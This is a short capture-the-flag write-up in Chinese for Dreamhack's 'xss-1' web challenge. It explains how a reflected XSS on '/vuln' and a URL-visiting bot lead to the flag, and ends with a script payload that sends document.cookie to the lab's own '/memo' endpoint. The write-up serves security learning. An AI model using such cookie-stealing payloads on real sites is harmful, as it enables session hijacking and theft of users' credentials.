---
title: xss-1
published: 2025-02-20
updated: 2025-07-09
description: "Dreamhack"
image: ""
tags: ["CTF Writeup", "Dreamhack", "Web"]
category: "Dreamhack"
draft: false
---

# xss-1

題目

> 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.  
> XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.  
> 플래그 형식은 DH{...} 입니다.

進入 `/vuln` 頁面可以發現 param 可以直接輸入 html 標籤並觸發 alert

![vuln](/assets/dreamhack/xss-1/image.png)

`/flag` 頁面可以提交 param

![param](/assets/dreamhack/xss-1/image-1.png)

`/memo` 會存出現過的文字

由題目給的 read_url 函式可知要將 cookies 傳到 `/memo`

提交 payload

```javascript
<script>
  location.href="http://127.0.0.1:8000/memo?memo="+document.cookie;
</script>
```

![flag](/assets/dreamhack/xss-1/image-2.png)
